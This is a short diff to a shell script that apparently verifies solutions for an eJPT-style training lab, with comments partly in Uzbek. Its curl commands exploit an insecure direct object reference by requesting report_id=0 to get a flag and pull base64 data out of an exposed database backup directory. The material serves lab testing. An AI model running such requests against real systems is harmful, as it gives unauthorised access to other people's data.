@@ -18,7 +18,7 @@ echo "### 1) IDOR — download.php (report_id=0 via Burp)"
 I=$($A "curl -s -X POST -d 'report_id=0' $T/download.php")
 chk "EJPT{id0r" "$I" "report_id=0 -> flag"
 ND=$($A "curl -s -X POST -d 'report_id=3' $T/download.php")
-chk "report #3" "$ND" "report_id=3 -> oddiy dummy (0 emas)"
+chk "Monthly Summary" "$ND" "report_id=3 -> oddiy report (0 emas, bir xil)"
 
 echo "### 2) Information disclosure — open dir -> base64"
 B64=$($A "curl -s $T/storage-backup/nimbus_db_2024-01-15.sql.txt | grep -oE 'base64\\): [A-Za-z0-9+/=]+' | awk '{print \$2}'")
